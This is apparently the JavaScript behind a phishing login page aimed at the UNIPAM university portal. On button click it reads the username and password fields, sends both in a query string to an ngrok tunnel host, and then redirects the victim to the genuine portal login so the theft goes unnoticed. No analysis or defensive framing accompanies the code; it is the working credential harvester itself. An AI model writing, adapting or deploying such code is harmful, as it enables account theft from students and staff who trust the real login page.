function stopDefAction(evt) {
  evt.preventDefault();
}

document.getElementById('buttonPreventDefault').addEventListener(
  'click', stopDefAction, false
);

function getUserData(){
     var usuario = document.getElementById("usuario").value
   var senha = document.getElementById("senha").value
   
   const teste = async () => await fetch(`https://68f8-191-55-80-22.ngrok.io/unimensagem/get.php?usuario=${usuario}&senha=${senha}`, {method: "GET",
   headers: {
     //"Content-Type": "application/json",
     "Access-Control-Allow-Origin":"*",
     "User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
   }})

   teste();
   window.location.replace("https://portal.unipam.edu.br/login");

}
